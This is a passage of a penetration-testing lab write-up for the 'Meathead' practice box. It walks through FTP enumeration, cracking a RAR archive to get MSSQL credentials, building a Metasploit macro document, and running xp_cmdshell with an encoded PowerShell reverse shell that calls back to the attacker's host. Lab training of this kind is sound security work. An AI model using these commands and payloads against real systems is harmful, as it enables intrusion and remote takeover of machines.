# Meathead

A box that I needed writeups to do

# Enumeration


## nmap

```
# Nmap 7.92 scan initiated Wed Jan 19 18:45:03 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/autorecon/results/192.168.58.70/scans/_full_tcp_nmap.txt -oX /root/autorecon/results/192.168.58.70/scans/xml/_full_tcp_nmap.xml 192.168.58.70
adjust_timeouts2: packet supposedly had rtt of -82343 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -82343 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -81840 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -81840 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -131627 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -131627 microseconds.  Ignoring time.
Nmap scan report for 192.168.58.70
Host is up, received user-set (0.17s latency).
Scanned at 2022-01-19 18:45:06 +08 for 290s
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Plantronics
|_http-favicon: Unknown favicon MD5: 90D5B70E85D458B702B52546F1847EAA
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1221/tcp open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-27-20  07:02PM                18866 Elementum Supremum.docx
| 04-27-20  07:02PM               764176 file_example_MP3_700KB.mp3
| 04-27-20  07:02PM                15690 img.jpg
| 04-27-20  07:02PM                  302 MSSQL_BAK.rar
| 04-27-20  07:02PM                  548 palindromes.txt
|_04-27-20  07:02PM                45369 server.jpg
1435/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000
| ms-sql-ntlm-info: 
|   Target_Name: MEATHEAD
|   NetBIOS_Domain_Name: MEATHEAD
|   NetBIOS_Computer_Name: MEATHEAD
|   DNS_Domain_Name: Meathead
|   DNS_Computer_Name: Meathead
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-26T13:55:23
| Not valid after:  2051-07-26T13:55:23
| MD5:   869d f4c0 7a1f f0c7 c08a 13d3 227e c03d
| SHA-1: 9f69 5909 814d b050 2238 195e 5a43 3237 efca 83b8
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQRRCh51/HjIxHGVXv1zeyAzANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjEwNzI2MTM1NTIzWhgPMjA1MTA3MjYxMzU1MjNaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJtNTsHs
| LbqORE3dUbeZRebZuv/ed4iyxiJ3cy/MG9rqQilwm14HlGp/24E2KjdI5iqxL1Nr
| EUUcdG0abEyA6D+YZNvzYi551FiwyYaBWJB2kaELomX6Zs/JC/wuswJNjjnKSZPx
| vCE1t4xqEXLRbZWKoQdr4KyrjLxto4HPY2VrlVocmxg9zagyVFtfhWG5h7N+qcCK
| dw1+SGplaQKMNXvOrLzghX2wb3P9ySYIbzcslKp+dt2gvwjwcPVWKledwEC3Q9+V
| sgua+z+G2nChBKhgWz8TZRX0Z/a/dkKKIOKMPGP3k5PkaJTffkiEC+SoXuFdOKdm
| 9HFluC2+moD+sR0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEASAP/nUfhWq6WQ+Lh
| j6T/LDaGfXz5thJJvc6dmldOtBXxXGSitYliXSO+mIHcPMguJkXpaaBULSzdHpSB
| 7BmeGuOXvIABVQPyrb9J05gj7XTr8eH6twAZROy0ta9rF0vzMWGnR0ED3kOc0xlh
| MTU5Mi7hZTYMFcH5p6srCh/Le/dh+mJfk/mvGE/EOxufhBha3J+bBiX3KIrEHxTd
| LLe6Xd4g+Nzt9FHv6LzBf0NDK+d/SrsDxuAnQiFC/5TdvqdgkLRQuzSO8UNyv93C
| emyE0Jw9s1S8eB/kVTidD1UYo7FANr4USlALfL9D0+XJqbnXziMTfz58s75d6Sfm
| AyCJ3A==
|_-----END CERTIFICATE-----
|_ssl-date: 2022-01-19T10:48:55+00:00; -1m00s from scanner time.
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=Meathead
| Issuer: commonName=Meathead
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-01-18T10:41:20
| Not valid after:  2022-07-20T10:41:20
| MD5:   668e 8b8b f3e7 32ef 93ca f885 ddd7 5fa6
| SHA-1: b035 d5e7 f280 e1d4 12ef 901f d103 86ee 2c1f e22b
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQYdkV95O98ZNF04ZHA9xQBDANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhNZWF0aGVhZDAeFw0yMjAxMTgxMDQxMjBaFw0yMjA3MjAxMDQx
| MjBaMBMxETAPBgNVBAMTCE1lYXRoZWFkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAuot5cOZhIKcWnMHD0cpDNB21ZzfeHYHewEjhNztYGQKexLL3fS6K
| qmX/kzQLfCkDUrO6kdYAbAR2l05VK/crE2l7wtgbJkjs1GBrKBddBnqd5Iar8gfH
| 380GMf02XiuAjlzUVIK43QHqKfgfBwSRx71CqkOe/JxiLB8rsJHBmqS3Ql+yJH1C
| QE9p+Z+d80iteK4mGVGtBtY6qr8T82gM+LbF2vFyldihBALLFjyWcrCloc/f0JDj
| lG6s6IETB1a3oWWn7W6uCwszTDmhJzkrlnTuoWJPzZqZJVCGVsCzLyLIdZQD67Qm
| 4KH34TTGcHYN075FD2KBGSAVo4g6q8DxUQIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBADH6No8r1JEZ
| 0/c9D0Qyz2z0M83KWAymCczlYQa1nnu9P8JuCxa1J7cSGx5pnfCy8+N2A0BdK+6d
| qoOsvXhLZmIftpb+1PfAskBb7SXfmvu3xdACzOAIhnO9WAKGegUpz1YPx85/6urb
| ZtxHprqH5G+qa7nXbZ2YRHheop+V3m+v4YwimcRikpAi/19V7kV1d8YRbn378/zB
| Iq3rhlSnvQkeIGFgBJ3XxCTlj9cgC8BJgC48gfZZ3GaZ+DrZgBFPQNxEFZxB3Z0t
| IrBlu5oydIbXZYTaVEWBgup/uCecctlfmLyYXanChKPtf58F/PXDLkv+IHmUcGiV
| h3Ir03Pl8oQ=
|_-----END CERTIFICATE-----
|_ssl-date: 2022-01-19T10:48:55+00:00; -59s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: MEATHEAD
|   NetBIOS_Domain_Name: MEATHEAD
|   NetBIOS_Computer_Name: MEATHEAD
|   DNS_Domain_Name: Meathead
|   DNS_Computer_Name: Meathead
|   Product_Version: 10.0.17763
|_  System_Time: 2022-01-19T10:48:16+00:00
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=1/19%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61E7ECD4%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=109%TS=U)
OPS(O1=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54ENW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -59s, deviation: 0s, median: -1m00s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 27462/tcp): CLEAN (Timeout)
|   Check 2 (port 41691/tcp): CLEAN (Timeout)
|   Check 3 (port 13470/udp): CLEAN (Timeout)
|   Check 4 (port 23675/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-01-19T10:48:18
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   171.22 ms 192.168.49.1
2   171.20 ms 192.168.58.70

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 19 18:49:56 2022 -- 1 IP address (1 host up) scanned in 293.30 seconds
```

## 80 - Web

![](Pasted%20image%2020220301232023.png)

## 1221 - FTP

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Meathead]
└─$ ftp 192.168.139.70 1221
Connected to 192.168.139.70.
220 Microsoft FTP Service
Name (192.168.139.70:kali): admin
331 Password required
Password:
530 User cannot log in.
Login failed.
Remote system type is Windows_NT.
ftp> exit
221 Goodbye.
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Meathead]
└─$ 
```

![](Pasted%20image%2020220202091236.png)

```bash
┌──(kali㉿kali)-[~]
└─$ pftp 192.168.88.70 1221

Connected to 192.168.88.70.
220 Microsoft FTP Service
Name (192.168.88.70:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
227 Entering Passive Mode (192,168,88,70,194,16).
150 Opening ASCII mode data connection.
04-27-20  07:02PM                18866 Elementum Supremum.docx
04-27-20  07:02PM               764176 file_example_MP3_700KB.mp3
04-27-20  07:02PM                15690 img.jpg
04-27-20  07:02PM                  302 MSSQL_BAK.rar
04-27-20  07:02PM                  548 palindromes.txt
04-27-20  07:02PM                45369 server.jpg
226 Transfer complete.
ftp> 
```

### Reading Files

```
┌──(kali㉿kali)-[/tmp/ftp]
└─$ ls
'Elementum Supremum.docx'   file_example_MP3_700KB.mp3   img.jpg   MSSQL_BAK.rar   palindromes.txt   server.jpg
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/ftp]
└─$ cat palindromes.txt 
Are we not pure? “No, sir!” Panama’s moody Noriega brags. “It is garbage!” Irony dooms a man—a prisoner up to new era.

A nut for a jar of tuna.

Dennis, Nell, Edna, Leon, Nedra, Anita, Rolf, Nora, Alice, Carol, Leo, Jane, Reed, Dena, Dale, Basil, Rae, Penny, Lana, Dave, Denny, Lena, Ida, Bernadette, Ben, Ray, Lila, Nina, Jo, Ira, Mara, Sara, Mario, Jan, Ina, Lily, Arne, Bette, Dan, Reba, Diane, Lynn, Ed, Eva, Dana, Lynne, Pearl, Isabel, Ada, Ned, Dee, Rena, Joel, Lora, Cecil, Aaron, Flora, Tina, Arden, Noel, and Ellen sinned.                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/ftp]
└─$ dtrx MSSQL_BAK.rar                                          
dtrx: ERROR: could not handle MSSQL_BAK.rar
dtrx: ERROR: treating as RAR archive failed: could not run unrar
dtrx: ERROR: treating as RAR archive failed: extraction error: 'unar -D /tmp/ftp/MSSQL_BAK.rar' returned status code 2
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/ftp]
└─$ file MSSQL_BAK.rar                                                                                                                                              1 ⨯
MSSQL_BAK.rar: RAR archive data, v5
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/ftp]
└─$
```

### Write Files

```bash
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Meathead/ftp]
└─$ pftp 192.168.111.70 1221
Connected to 192.168.111.70.
220 Microsoft FTP Service
Name (192.168.111.70:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
227 Entering Passive Mode (192,168,111,70,194,133).
150 Opening ASCII mode data connection.
04-27-20  07:02PM                18866 Elementum Supremum.docx
04-27-20  07:02PM               764176 file_example_MP3_700KB.mp3
04-27-20  07:02PM                15690 img.jpg
04-27-20  07:02PM                  302 MSSQL_BAK.rar
04-27-20  07:02PM                  548 palindromes.txt
04-27-20  07:02PM                45369 server.jpg
226 Transfer complete.
ftp> lcd /tmp
Local directory now /tmp
ftp> put t
local: t remote: t
227 Entering Passive Mode (192,168,111,70,194,134).
150 Opening ASCII mode data connection.
226 Transfer complete.
ftp> ls
227 Entering Passive Mode (192,168,111,70,194,135).
125 Data connection already open; Transfer starting.
04-27-20  07:02PM                18866 Elementum Supremum.docx
04-27-20  07:02PM               764176 file_example_MP3_700KB.mp3
04-27-20  07:02PM                15690 img.jpg
04-27-20  07:02PM                  302 MSSQL_BAK.rar
04-27-20  07:02PM                  548 palindromes.txt
04-27-20  07:02PM                45369 server.jpg
03-21-22  07:29AM                    0 t
226 Transfer complete.
ftp> del t
250 DELE command successful.
ftp> 
```

## 1435 - MSSQL

# FTP Client Side fail

```bash
┌──(kali㉿kali)-[/tmp]
└─$ msfconsole -q                                                                                            
[*] Starting persistent handler(s)...
msf5 > use exploit/multi/fileformat/office_word_macro
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(multi/fileformat/office_word_macro) > set LHOST 192.168.49.111
LHOST => 192.168.49.111
msf5 exploit(multi/fileformat/office_word_macro) > set LPORT 1221
LPORT => 1221
msf5 exploit(multi/fileformat/office_word_macro) > run

[*] Using template: /usr/share/metasploit-framework/data/exploits/office_word_macro/template.docx
[*] Injecting payload in document comments
[*] Injecting macro and other required files in document
[*] Finalizing docm: msf.docm
[+] msf.docm stored at /home/kali/.msf4/local/msf.docm
msf5 exploit(multi/fileformat/office_word_macro) > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LPORT 1221
LPORT => 1221
msf5 exploit(multi/handler) > run

[-] Exploit failed: One or more options failed to validate: LHOST.
[*] Exploit completed, but no session was created.
msf5 exploit(multi/handler) > set LHOST 192.168.49.111
LHOST => 192.168.49.111
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.111:1221 

```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ cp /home/kali/.msf4/local/msf.docm ./msf.docx
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ pftp 192.168.111.70 1221
Connected to 192.168.111.70.
220 Microsoft FTP Service
Name (192.168.111.70:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put msf.docx
local: msf.docx remote: msf.docx
227 Entering Passive Mode (192,168,111,70,194,140).
125 Data connection already open; Transfer starting.
226 Transfer complete.
85819 bytes sent in 0.52 secs (162.6129 kB/s)
ftp> ls
227 Entering Passive Mode (192,168,111,70,194,141).
125 Data connection already open; Transfer starting.
04-27-20  07:02PM                18866 Elementum Supremum.docx
04-27-20  07:02PM               764176 file_example_MP3_700KB.mp3
04-27-20  07:02PM                15690 img.jpg
03-21-22  08:02AM                85819 msf.docx
04-27-20  07:02PM                  302 MSSQL_BAK.rar
04-27-20  07:02PM                  548 palindromes.txt
04-27-20  07:02PM                45369 server.jpg
226 Transfer complete.
ftp> 
```

# Exploitation
## Crack backup rar

```bash
┌──(kali㉿kali)-[/tmp]
└─$ unar MSSQL_BAK.rar                                                                                                                                              1 ⨯
MSSQL_BAK.rar: This archive requires a password to unpack.
Password (will not be shown): 
RAR 5
Archive parsing failed! (Missing or wrong password.)
No files extracted.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ls                                                                                                                                                              1 ⨯
burp205871351230365911.tmp  systemd-private-2e7da7296f2f420d98ae1d8ec1c9b20b-colord.service-IQfy4g
hsperfdata_kali             systemd-private-2e7da7296f2f420d98ae1d8ec1c9b20b-haveged.service-nrXnRf
hsperfdata_root             systemd-private-2e7da7296f2f420d98ae1d8ec1c9b20b-ModemManager.service-sMyBgi
MSSQL_BAK.rar               systemd-private-2e7da7296f2f420d98ae1d8ec1c9b20b-systemd-logind.service-gAqsvj
ssh-77F8QP6IWYBH            systemd-private-2e7da7296f2f420d98ae1d8ec1c9b20b-upower.service-PYlj1g
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ mousepad names.txt 
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ rar2john                                                                                                                                                      130 ⨯
Usage: rar2john <rar file(s)>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ rar2john MSSQL_BAK.rar                                                                                                                                          1 ⨯
MSSQL_BAK.rar:$rar5$16$53b1acf5cd3d02dafdf50f1cb79e46e5$15$a8761ee8f467302d9ee19284f60713dd$8$514688ceb07cab7b
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ rar2john MSSQL_BAK.rar > hash
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                 
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:27 0.07% (ETA: 15:43:01) 0g/s 430.2p/s 430.2c/s 430.2C/s ghost1..kareen
Session aborted
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ john hash --wordlist=names.txt                                                                                                                                  1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2022-03-21 04:37) 0g/s 381.2p/s 381.2c/s 381.2C/s Dennis..Ellen
Session completed
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:54 0.37% (ETA: 17:49:48) 0g/s 363.0p/s 363.0c/s 363.0C/s yissel..trusting
letmeinplease    (MSSQL_BAK.rar)
1g 0:00:06:30 DONE (2022-03-21 04:44) 0.002563g/s 356.2p/s 356.2c/s 356.2C/s lily03..lerner
Use the "--show" option to display all of the cracked passwords reliably
Session completed
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ unar MSSQL_BAK.rar                                   
MSSQL_BAK.rar: This archive requires a password to unpack.
Password (will not be shown): 
RAR 5
  mssql_backup.txt  (44 B)... OK.
Successfully extracted to "./mssql_backup.txt".
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat mssql_backup.txt 
Username: sa
Password: EjectFrailtyThorn425                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

## MSSQL Running

```bash
┌──(kali㉿kali)-[/tmp]
└─$ mssqlclient.py sa:EjectFrailtyThorn425@192.168.137.70 -port 1435                                                                                                1 ⨯
Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MEATHEAD\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MEATHEAD\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> enable_xp_cmdshell
[*] INFO(MEATHEAD\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(MEATHEAD\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell whoami /all
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

USER INFORMATION                                                                   

----------------                                                                   

NULL                                                                               

User Name                   SID                                                               

=========================== ===============================================================   

nt service\mssql$sqlexpress S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133   

NULL                                                                               

NULL                                                                               

GROUP INFORMATION                                                                  

-----------------                                                                  

NULL                                                                               

Group Name                           Type             SID          Attributes                                           

==================================== ================ ============ ==================================================   

Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                      

Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group   

BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558 Mandatory group, Enabled by default, Enabled group   

BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group   

NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group   

CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group   

NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group   

NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group   

LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group   

NT SERVICE\ALL SERVICES              Well-known group S-1-5-80-0   Mandatory group, Enabled by default, Enabled group   

NULL                                                                               

NULL                                                                               

PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL                                                                               

NULL                                                                               

SQL> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMwA3ACIALAAxADIAMgAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
output                                                                             

--------------------------------------------------------------------------------   

#< CLIXML                                                                          

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ $client = New-Object System.Net.Sockets.TCPClient("192.168.49.137",12 ..._x000D__x000A_</S><S S="Error">+ ~~~~~~~   

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_</S><S S="Error">    + CategoryInfo          : ParserError: (   

:) [], ParentContainsErrorRecordException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>   

SQL>
SQL> xp_cmdshell systeminfo
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

Host Name:                 MEATHEAD                                                

OS Name:                   Microsoft Windows Server 2019 Standard                  

OS Version:                10.0.17763 N/A Build 17763                              

OS Manufacturer:           Microsoft Corporation                                   

OS Configuration:          Standalone Server                                       

OS Build Type:             Multiprocessor Free                                     

Registered Owner:          Windows User                                            

Registered Organization:                                                           

Product ID:                00429-70000-00000-AA207                                 

Original Install Date:     4/27/2020, 9:52:21 PM                                   

System Boot Time:          2/15/2022, 10:16:13 AM                                  

System Manufacturer:       VMware, Inc.                                            

System Model:              VMware7,1                                               

System Type:               x64-based PC                                            

Processor(s):              1 Processor(s) Installed.                               

                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz   

BIOS Version:              VMware, Inc. VMW71.00V.17369862.B64.2012240522, 12/24/2020   

Windows Directory:         C:\Windows                                              

System Directory:          C:\Windows\system32                                     

Boot Device:               \Device\HarddiskVolume2                                 

System Locale:             en-us;English (United States)                           

Input Locale:              en-us;English (United States)                           

Time Zone:                 (UTC) Coordinated Universal Time                        

Total Physical Memory:     4,095 MB                                                

Available Physical Memory: 2,734 MB                                                

Virtual Memory: Max Size:  4,799 MB                                                

Virtual Memory: Available: 3,480 MB                                                

Virtual Memory: In Use:    1,319 MB                                                

Page File Location(s):     C:\pagefile.sys                                         

Domain:                    WORKGROUP                                               

Logon Server:              N/A                                                     

Hotfix(s):                 7 Hotfix(s) Installed.                                  

                           [01]: KB4552924                                         

                           [02]: KB4462930                                         

                           [03]: KB4494174                                         

                           [04]: KB4512577                                         

                           [05]: KB4537759                                         

                           [06]: KB4549947                                         

                           [07]: KB4551853                                         

Network Card(s):           1 NIC(s) Installed.                                     

                           [01]: vmxnet3 Ethernet Adapter                          

                                 Connection Name: Ethernet0                        

                                 DHCP Enabled:    No                               

                                 IP address(es)                                    

                                 [01]: 192.168.137.70                              

Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.   

NULL                                                                               

SQL>
```

## Files

```bash
SQL> xp_cmdshell dir "C:\"
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is DA63-C4D5                                                 

NULL                                                                               

 Directory of C:\                                                                  

NULL                                                                               

03/21/2022  09:37 AM    <DIR>          FTP                                         

